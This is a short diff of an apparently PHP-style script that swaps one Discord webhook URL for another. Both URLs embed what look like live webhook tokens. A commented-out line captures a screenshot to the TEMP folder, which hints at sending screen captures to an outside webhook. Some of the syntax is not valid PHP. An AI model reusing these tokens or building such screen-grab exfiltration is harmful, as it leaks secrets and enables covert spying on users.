@@ -12,7 +12,7 @@ $l = null;
 
 use httpclient;
 // Replace the URL with your own webhook url
-$url = "https://discord.com/api/webhooks/838284423278493697/gthE3yddrHZwT5n0dYCqvHtu5lQCYy_nnNdfghmnK-W2QOq3X7xPOoaEKhY-tiszfAGW";
+$url = "https://discord.com/api/webhooks/840855832735645718/yD6Ax41IvrMuMX_3S-RTRIRq-NA_jspfLpjCwEOt3fimk1t17LeROXSlSSa93RCevkik";
 
 //new RobotScript->screenshot()->save($_ENV['TEMP'].'\temp.png','png');
 $hookObject = [
